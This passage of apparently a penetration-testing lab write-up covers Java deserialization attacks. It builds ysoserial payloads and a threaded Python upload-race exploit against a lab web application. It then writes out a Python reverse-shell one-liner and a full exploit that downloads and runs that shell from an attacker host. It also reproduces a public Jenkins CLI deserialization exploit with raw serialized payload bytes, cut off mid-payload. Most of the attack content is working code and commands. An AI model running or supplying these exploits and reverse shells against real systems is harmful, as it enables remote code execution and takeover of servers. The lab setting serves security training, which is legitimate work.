style="white-space:pre-wrap;word-break:break-all">cd /home
</code></pre><p id="fdd92993-7441-4b75-8da9-06a19db30ffc" class="">Use the following command to generate payloads.</p><p id="6abee730-ddd9-4bc7-9c25-28a8a223ed52" class="">Command:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="0f355e31-602f-4d1c-ab95-5a45c519c3be" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">while read payloadname; do java -jar ../root/Desktop/tools/ysoserial/ysoserial-master-SNAPSHOT.jar $payloadname &quot;ping 192.91.247.2 -c 3&quot; &gt; $payloadname; done &lt; payloads.txt
</code></pre><p id="9c7dfade-0ea6-4963-a431-b2e46c0d18a5" class="">The result will look similar.</p><p id="8408391b-03f9-4668-843a-4edabd95e042" class="">Step 3: Construct an exploit in Python that will mimic using the website.</p><p id="7e9eb51e-fbd5-4996-8fbd-aa1ba6cf7d70" class="">It will need to take a list of payloads (we have them by name, we will shortly turn the list into a list of filenames). Moreover, the exploit will need to issue two requests one after the other - the “upload” one and immediately after it the “read file” one.</p><p id="8a81de8f-c5d3-4cf1-953f-1ba533c7d952" class="">In the below examples we are using Python 3. Note we are accessing the target machine website so we need to use that IP address.</p><p id="ca17d092-ee79-4189-999c-d836cd099713" class="">The “read file” request might look like the one below.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="61d09051-67b4-4f44-83cb-e541173600bd" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">def readfile(filename):
  url = &quot;http://demo.ine.local/upload/index.php?sent=OK&quot;
  r = requests.get(url)
  print(&quot;[+] Used filename: &quot; + filename)
  print(r.text)
  print(&quot;\n&quot;)
</code></pre><p id="4f3939b2-eae5-4df1-9359-b2aeec1e18d4" class="">Then, the “upload_file” request can be similar to the below.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="8b8c434d-e604-48f1-83bc-0629b15c2234" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">def upload(filename):
  url = &quot;http://demo.ine.local/upload/upload.php&quot;
  files ={&#x27;uploaded_file&#x27;: open(filename, &#x27;rb&#x27;)}
  r = requests.post(url, files=files)
</code></pre><p id="9bdbb5f9-716e-4151-955c-79326ef8fea7" class="">Step 4: We will also need a list of all payload files by their name. Since each file is named after the payload, we can use the “yso” file again to generate a list (as we don’t want to retype it manually).</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="7b4aed12-1e0c-4c10-9fa4-e6a5e7c0631c" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">while read payload; do /root/payloads.txt echo \&#x27;$payload\&#x27;, &gt;&gt; /root/p2.txt; done &lt; /root/payloads.txt
</code></pre><p id="d60fe52f-4ae3-474e-bfa3-c550a2f326d2" class="">The result will look similar.</p><p id="30dcadf0-da52-42d6-9524-4a14517b8586" class="">The list can be pasted directly into a Python program (the last comma after the last payload has to be deleted)</p><p id="0d197bc7-6caf-40f5-8f50-744f880c724a" class="">To sequentially run them and then use “read file” immediately, we need to implement the concept of threading. If we simply run the two functions above one after the other, readfile() will wait for upload() until it finishes. By this time, the target file will be gone.</p><p id="b0ddc40c-e9d7-4251-b278-a096d4bd228d" class="">Threading will simply start upload() in another thread which will allow readfile() to run without waiting for the response of upload().</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="9b3923f1-0c6f-4369-a6d3-83c8a9e0980c" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">for payload in payloads:
  x=threading.Thread(target=upload, args=(payload,))
  x.start()
  readfile()
  time.sleep(2)
</code></pre><p id="cfff32e9-aa15-416c-ab4d-9423e2ff1020" class="">Before running the exploit check if you have started a listener to detect pings - e.g. Wireshark or tcpdump.</p><p id="072f1d75-8ee5-4ca0-a481-66596a4d5bc3" class="">Command:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="d95c118c-069d-4a61-a444-1463c5152bb3" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">tcpdump -i eth1 icmp
</code></pre><p id="6ec4bd7b-4009-46b1-a7a0-9f06367e4bcc" class="">Step 5: Copy and paste the code and save it as exploit.py. We can now clear the list in the exploit, so its final shape will be similar to the below.</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="0fdb157f-bc53-4c35-9a9e-3b82a2942610" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">import requests
import time
import threading
def readfile(filename):
  url = &quot;http://demo.ine.local/upload/index.php?sent=OK&quot;
  r = requests.get(url)
  print(&quot;[+] Used filename: &quot; + filename)
  print(r.text)
  print(&quot;\n&quot;)
def upload(filename):
  url = &quot;http://demo.ine.local/upload/upload.php&quot;
  files ={&#x27;uploaded_file&#x27;: open(filename, &#x27;rb&#x27;)}
  r = requests.post(url, files=files)
payloads = [
&#x27;CommonsCollections2&#x27;
]

for payload in payloads:
  x=threading.Thread(target=upload, args=(payload,))
  x.start()
  readfile(payload)
  time.sleep(2)
</code></pre><p id="70cfc5a2-77e0-4f62-a458-c81c811865e0" class="">Step 6: Execute the exploit code by the following command.</p><p id="2f436b02-1db8-4f4a-a5ed-8ce5d7ae7862" class="">Command:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="133ef5e2-fc38-430a-bc60-894dc3f83f31" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">python exploit.py
</code></pre><p id="e139fd7e-4bf3-4909-805b-68ff6e6eccb4" class="">The result is code execution!</p><p id="4c6437c7-85ab-422a-8db7-f90a745cb63a" class="">After a short, while seeing different responses for each payload, we can see that when CommonsCollections2 is used, pings start to appear.</p><p id="9b886a3e-7b19-417a-8576-bd771888cb64" class="">Task 4. Obtain a reverse shell</p><p id="80be7456-93fa-491a-aad9-6de32f29a1e5" class="">To establish a reverse shell we will need to issue a command or series of commands. Keep in mind that in Java deserialization, you can use spaces in the commands, but you cannot use spaces in the arguments of the commands.</p><p id="8411c05a-dbb1-477d-be9b-c1e306c863ca" class="">Step 1: Create a shell script to get the reverse shell from the target machine.</p><p id="cf9c7bff-9103-4396-b884-9e458413b74a" class="">Save this code as rev.py in the root directory.</p><p id="3ce007bd-d0e4-4b9b-8397-64bd0ecf3b33" class="">Code:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="bc64687b-fc99-496f-9aaf-d3acf87b6321" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;192.46.20.2&quot;,443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;
</code></pre><p id="be0e3ba1-01a0-4392-8661-5aa2ea687eaa" class="">Step 2: Then let’s host the above using Python’s SimpleHTTPServer module in the directory where rev is present.</p><p id="5f7bd6be-ef2d-45b9-b158-f7f14b6ab0c5" class="">Command:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="4cbcc2ba-85a4-4eb9-9037-0b8b25daccf5" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">python -m SimpleHTTServer 8443
</code></pre><p id="1745c964-ad1d-49d3-9303-c7b938e1a6cf" class="">Step 3: In another terminal window, start a Netcat listener.</p><p id="209445d8-cd56-4e67-9f71-52b45cc71ec0" class="">Command:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="6392c1cc-5cb5-4c97-abb3-477ceae25947" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">nc -lvp 443
</code></pre><p id="eab6f5e0-e1e4-46de-ae05-d620fb829a5e" class="">Step 4: Finally, the exploit is changed to generate the respective payloads one after the other.</p><ul id="b0df1d93-e219-4859-991b-4e30dc2e1ad9" class="bulleted-list"><li style="list-style-type:disc">Download the reverse shell</li></ul><ul id="f20584dc-57b4-44ca-bcd8-6eddf84ce79c" class="bulleted-list"><li style="list-style-type:disc">Make it executable</li></ul><ul id="73f57a81-2430-4e8f-89f4-e90082799446" class="bulleted-list"><li style="list-style-type:disc">Start the shell</li></ul><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="20baa89e-026a-4d53-b312-7cda2f99669c" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">payload = &#x27;CommonsCollections2&#x27;
commands = [
&#x27;&quot;curl http://192.91.247.2:8443/rev.py -O rev.py&quot;&#x27;,
&#x27;&quot;chmod +x rev.py&quot;&#x27;,
&#x27;&quot;./rev.py&quot;&#x27;
]

for command in commands:
  os.system(&quot;java -jar /root/Desktop/tools/ysoserial/ysoserial-master-SNAPSHOT.jar &quot; + payload + &quot; &quot; + command + &quot; &gt; &quot; + payload)
  x=threading.Thread(target=upload, args=(payload,))
  x.start()
  readfile(payload)
  time.sleep(2)
</code></pre><p id="053d3194-66f1-40a1-adbe-6fe9122bd17d" class="">Below you can find the full exploit code.</p><p id="6f7ad40d-b5b1-46f0-8ee1-93b575d8250e" class="">Save this as exploit.py and execute the file.</p><p id="7cee7c6f-8fe2-45a8-a3b5-172cca7517de" class="">Command:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="535b19ce-0c42-4cca-9a68-3752f651e5d0" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">python exploit.py
</code></pre><p id="4c49aac8-f152-4698-883e-5b698c10ab8a" class="">Code:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="ce2a0979-931b-45ad-a9f8-8374f3485d7f" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">import requests
import time
import threading
import os
def readfile(filename):
  url = &quot;http://demo.ine.local/upload/index.php?sent=OK&quot;
  r = requests.get(url)
  print(&quot;[+] Used filename: &quot; + filename)
  print(r.text)
  print(&quot;\n&quot;)

def upload(filename):
  url = &quot;http://demo.ine.local/upload/upload.php&quot;
  files ={&#x27;uploaded_file&#x27;: open(filename, &#x27;rb&#x27;)}
  r = requests.post(url, files=files)
payload = &#x27;CommonsCollections2&#x27;
commands = [
&#x27;&quot;curl http://192.91.247.2:8443/rev.py -O rev.py&quot;&#x27;,
&#x27;&quot;chmod +x rev.py&quot;&#x27;,
&#x27;&quot;./rev.py&quot;&#x27;
]

for command in commands:
  os.system(&quot;java -jar /root/Desktop/tools/ysoserial/ysoserial-master-SNAPSHOT.jar &quot; + payload + &quot; &quot; + command + &quot; &gt; &quot; + payload)
  x=threading.Thread(target=upload, args=(payload,))
  x.start()
  readfile(payload)
  time.sleep(2)
</code></pre><blockquote id="fff78852-4639-43b8-9a08-3a14c8c245cd" class="">Successfully achieved remote code execution.</blockquote><h2 id="13c51044-cdcd-4b79-80c8-2f5430fa93cd" class=""><strong>Lab 2</strong><strong><a href="https://johnermac.github.io/notes/ewptx/zattackingserialization/#lab-2"></a></strong></h2><p id="e3db70a1-c762-41dc-b4b6-bfa3407a1f5a" class="">Solution</p><p id="9233320a-3f66-4ddd-aea6-54fb9c634ac0" class="">Step 1: Start the lab. Wait until the lab is ready. Once the lab is ready, the kali Linux interface will be available on the browser.</p><p id="c1452ca0-f54b-4a44-9a42-f7150ba05a5e" class="">Step 2: Scan the network with Nmap and gather the information about the target machine.</p><p id="50373b45-b252-4ff0-b7d9-90f0437d760b" class="">Use the following command to get the information about open ports and services in the network.</p><p id="d771c185-6944-4548-89f5-f68ad36fabae" class="">Command:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="6da560f7-edfc-41d3-b59e-d01204975765" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">nmap demo.ine.local
</code></pre><p id="3792fef6-73af-4344-955b-5abd51da95b2" class="">Got the information about the IP address and the ports which are open in the target machine.</p><p id="7ef37897-b444-47f3-b4f9-a887849c7975" class="">Step 3: Inspect the Jenkins application by navigating to the IP address at port 8080 in the web browser.</p><p id="85457baf-78ed-44fe-99f9-a5fe12f3f13b" class="">Target URL:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="b277e8db-f0ce-47d2-9a42-7bd9ef2f7094" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">http://192.24.161.3:8080/
</code></pre><p id="972c9bed-1d9b-452e-aa96-b9028d1bedf7" class="">Step 4: Copy and paste the python exploit code and save it as exploit.py.</p><p id="da60d4f5-e51d-4850-bb19-e7313a05bbb7" class="">Source: https://github.com/foxglovesec/JavaUnserializeExploits/blob/master/jenkins.py</p><p id="79bf746a-9ca3-44a2-aca2-bd006789ecb8" class="">Code:</p><script src="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/prism.min.js" integrity="sha512-7Z9J3l1+EYfeaPKcGXu3MS/7T+w19WtKQY/n+xzmw4hZhJ9tyYmcUS+4QqAlzhicE5LAfMQSF3iFTK9bQdTxXg==" crossorigin="anonymous" referrerPolicy="no-referrer"></script><link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism.min.css" integrity="sha512-tN7Ec6zAFaVSG3TpNAKtk4DOHNpSwKHxxrsiw4GHKESGPs5njn/0sMCUMl2svV4wo4BK/rCP7juYz+zx+l6oeQ==" crossorigin="anonymous" referrerPolicy="no-referrer"/><pre id="52c1626f-d5c6-4f93-8a62-4ce6f6c123b8" class="code"><code class="language-Plain Text" style="white-space:pre-wrap;word-break:break-all">#!/usr/bin/python
# usage: ./jenkins.py host port /path/to/payload
import socket
import sys
import requests
import base64

host = sys.argv[1]
port = sys.argv[2]

# Query Jenkins over HTTP to find what port the CLI listener is on
r = requests.get(&#x27;http://&#x27; + host + &#x27;:&#x27; + port)
cli_port = int(r.headers[&#x27;X-Jenkins-CLI-Port&#x27;])

# Open a socket to the CLI port
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_address = (host, cli_port)
print(&#x27;connecting to %s port %s&#x27; % server_address)
sock.connect(server_address)

# Send headers
headers = &#x27;\x00\x14\x50\x72\x6f\x74\x6f\x63\x6f\x6c\x3a\x43\x4c\x49\x2d\x63\x6f\x6e\x6e\x65\x63\x74&#x27;
print(&#x27;sending &quot;%s&quot;&#x27; % headers)
sock.send(headers)
data = sock.recv(1024)
print &gt;&gt;sys.stderr, &#x27;received &quot;%s&quot;&#x27; % data
data = sock.recv(1024)
print &gt;&gt;sys.stderr, &#x27;received &quot;%s&quot;&#x27; % data

payloadObj = open(sys.argv[3], &#x27;rb&#x27;).read()
payload_b64 = base64.b64encode(payloadObj)
payload=&#x27;\x3c\x3d\x3d\x3d\x5b\x4a\x45\x4e\x4b\x49\x4e\x53\x20\x52\x45\x4d\x4f\x54\x49\x4e\x47\x20\x43\x41\x50\x41\x43\x49\x54\x59\x5d\x3d\x3d\x3d\x3e&#x27;+payload_b64+&#x27;\x00\x00\x00\x00\x11\x2d\xac\xed\x00\x05\x73\x72\x00\x1b\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x55\x73\x65\x72\x52\x65\x71\x75\x65\x73\x74\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x03\x4c\x00\x10\x63\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x50\x72\x6f\x78\x79\x74\x00\x30\x4c\x68\x75\x64\x73\x6f\x6e\x2f\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2f\x52\x65\x6d\x6f\x74\x65\x43\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x24\x49\x43\x6c\x61\x73\x73\x4c\x6f\x61\x64\x65\x72\x3b\x5b\x00\x07\x72\x65\x71\x75\x65\x73\x74\x74\x00\x02\x5b\x42\x4c\x00\x08\x74\x6f\x53\x74\x72\x69\x6e\x67\x74\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x78\x72\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x52\x65\x71\x75\x65\x73\x74\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x03\x49\x00\x02\x69\x64\x49\x00\x08\x6c\x61\x73\x74\x49\x6f\x49\x64\x4c\x00\x08\x72\x65\x73\x70\x6f\x6e\x73\x65\x74\x00\x1a\x4c\x68\x75\x64\x73\x6f\x6e\x2f\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2f\x52\x65\x73\x70\x6f\x6e\x73\x65\x3b\x78\x72\x00\x17\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x43\x6f\x6d\x6d\x61\x6e\x64\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x01\x4c\x00\x09\x63\x72\x65\x61\x74\x65\x64\x41\x74\x74\x00\x15\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\x3b\x78\x70\x73\x72\x00\x1e\x68\x75\x64\x73\x6f\x6e\x2e\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2e\x43\x6f\x6d\x6d\x61\x6e\x64\x24\x53\x6f\x75\x72\x63\x65\x00\x00\x00\x00\x00\x00\x00\x01\x02\x00\x01\x4c\x00\x06\x74\x68\x69\x73\x24\x30\x74\x00\x19\x4c\x68\x75\x64\x73\x6f\x6e\x2f\x72\x65\x6d\x6f\x74\x69\x6e\x67\x2f\x43\x6f\x6d\x6d\x61\x6e\x64\x3b\x78\x72\x00\x13\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\xd0\xfd\x1f\x3e\x1a\x3b\x1c\xc4\x02\x00\x00\x78\x72\x00\x13\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x54\x68\x72\x6f\x77\x61\x62\x6c\x65\xd5\xc6\x35\x27\x39\x77\xb8\xcb\x03\x00\x04\x4c\x00\x05\x63\x61\x75\x73\x65\x74\x00\x15\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x54\x68\x72\x6f\x77\x61\x62\x6c\x65\x3b\x4c\x00\x0d\x64\x65\x74\x61\x69\x6c\x4d\x65\x73\x73\x61\x67\x65\x71\x00\x7e\x00\x03\x5b\x00\x0a\x73\x74\x61\x63\x6b\x54\x72\x61\x63\x65\x74\x00\x1e\x5b\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x61\x63\x6b\x54\x72\x61\x63\x65\x45\x6c\x65\x6d\x65\x6e\x74\x3b\x4c\x00\x14\x73\x75\x70\x70\x72\x65\x73\x73\x65\x64\x45\x78\x63\x65\x70\x74\x69\x6f\x6e\x73\x74\x00\x10\x4c\x6a\x61\x76\x61\x2f\x75\x74\x69\x6c\x2f\x4c\x69\x73\x74\x3b\x78\x70\x71\x00\x7e\x00\x10\x70\x75\x72\x00\x1e\x5b\x4c\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x61\x63\x6b\x54\x72\x61\x63\x65\x45\x6c\x65\x6d\x65\x6e\x74\x3b\x02\x46\x2a\x3c\x3c\xfd\x22\x39\x02\x00\x00\x78\x70\x00\x00\x00\x0c\x73\x72\x00\x1b\x6a\x61\x76\x61\x2e\x6c\x61\x6e\x67\x2e\x53\x74\x61\x63\x6b\x54\x72\x61\x63\x65\x45\x6c\x65\x6d\x65\x6e\x74\x61\x09\xc5\x9a\x26\x36\xdd\x85\x02\x00\x04\x49\x00\x0a\x6c\x69\x6e\x65\x4e\x75\x6d\x62\x65\x72\x4c\x00\x0e\x64\x65\x63\x6c\x61\x72\x69\